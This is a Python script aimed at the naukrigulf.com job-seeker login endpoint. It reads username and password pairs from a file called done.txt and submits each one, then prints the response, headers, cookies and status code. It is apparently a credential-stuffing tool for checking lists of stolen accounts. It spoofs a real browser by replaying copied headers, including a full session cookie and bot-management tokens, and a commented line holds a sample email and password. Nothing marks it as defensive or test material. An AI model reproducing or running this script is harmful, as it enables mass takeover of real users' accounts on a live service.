import requests
had={'Accept': 'application/json',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'ARABIC',
	'Appid':'205',
	'Cache-Control':'no-cache',
	'Client-Type':'desktop',
	'Clientid':'Engt0P',
	'Content-Length':'59',
	'Content-Type':'application/json',
	'Cookie':'_t_ds=fc8002e1696073086-178fc8002e-0fc8002e; aka_location=Country=EG; pwa_lang=ar; _ngenv1[lang]=en; puppeteer=FALSE; resmanexp=; mboost=false; mboost50=false; profileCom=y; chatbotonorganicresman=n; chatbotonmarketingresman=y; chatbotonmarketingresmanAr=y; chatbotonorganicresmanAr=n; countryc=EG; countryn=Egypt; city=Cairo; state=Cairo Governorate; expreco=B; _t_ds=fc8063f1696073089-224fc8063f-0fc8063f; aka_location=Country=EG; _ga=GA1.1.244345972.1696073092; ak_bmsc=5D674284B33BFA32E3389B2A123900EF~000000000000000000000000000000~YAAQzHRZaJb2asqKAQAAQYvV5RXFi8Nsx94gUV25ANECAbTfV68YrD9J1owJz5ExTE/GQZuSiHwJ+Y0eZS+aOU6NFzuRcuYgJHqi53Kl8FL54UGmHQALpYEZ2Ctn0rYFQtjrtQZyTpywMcfMq6S+cJltUhYR2awSUvRC0IevjYgbwYl9T/7lKHm3jZJyxRpl4rihYnJgpBcSNEB7OBxdvKrFyYrrYc1s5397szaQAxzEIZa4boXs06ocBqDj/oDb2e0Cu+nrXtBvKFK27jYs4mC102gLxdKWx3NMoweUCjmTp9xkSV/wCzusNm2MODbM5eRRVnP9mOzMN38Ujc73UYhxQuppMGKAhWtm8jOnLT/Nfare7IYgBfxUW4RHRpojc64EoSeCtMZp9H9d7ibG5RqjmPMIKm2omTBhznNkf2Cs4fKpldqg3Iv1oZ1LcIIXBShbbKeuLvbHpe/8rebVJ9nfQufuokRc0K2Url9dUukRzwM0EqrOQc3OL4YXqepb6h2PlN9x; __utmc=127812882; __utmz=127812882.1696073088.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __ccode=EG; G_ENABLED_IDPS=google; isJsLoggedIn=false; __utma=127812882.244345972.1696073092.1696073088.1696079827.2; __utmt=1; bm_sv=274B0676F9843A912AED1BEBD67A9ACD~YAAQF/ptaI9lltaKAQAANV085hVVvWAB60+ZWlA81jK+0Kzwr2paMuETbmXCUhgwXieqtrE4dknNCfFERNwniWinx5+mg8ciamo7rv0KxyNfrFjIUy+7eLifh3XTstONX8OXBdLXMJsUjDQfBYUGoNjqjTOZ+malUIpHXbz39VGYfnGdpEqCpE3ab1aGaBrMFeYa73Sujn0NNzybEf9S9qya5O0XJsf3MDzRYOJZVm8T89Hf75qsJH6UZxC6QcVt0WE7GXA=~1; __utmb=127812882.2.9.1696079831147; _ga_Q866Y8JT5J=GS1.1.1696079828.2.1.1696079870.0.0.0',
	'Device-Type':'desktop',
	'Locationid':'',
	'Origin':'https://arabic.naukrigulf.com',
	'Referer':'https://arabic.naukrigulf.com/jobseeker/login',
	'Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114"',
	'Sec-Ch-Ua-Mobile':'?0',
	'Sec-Ch-Ua-Platform':'"Linux"',
	'Sec-Fetch-Dest':'empty',
	'Sec-Fetch-Mode':'cors',
	'Sec-Fetch-Site':'same-origin',
	'Source':'any',
	'Systemid':'2323',
	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
}
#data={"username":"red0033@gmail.com","password":"Ppa$$w0rd!"}


url='https://arabic.naukrigulf.com/nglogin/user/login'
with open("done.txt", "r") as file:
    lines = file.readlines()
for line in lines:
    username, password = line.strip().split("|")
    data={"username":username,"password":password}
    response = requests.post(url, headers=had,json=data)
    print(response.text)
    print(response.headers)
    print("*"*50)
    print(response.cookies)
    print("*"*50)
    print(response.status_code)
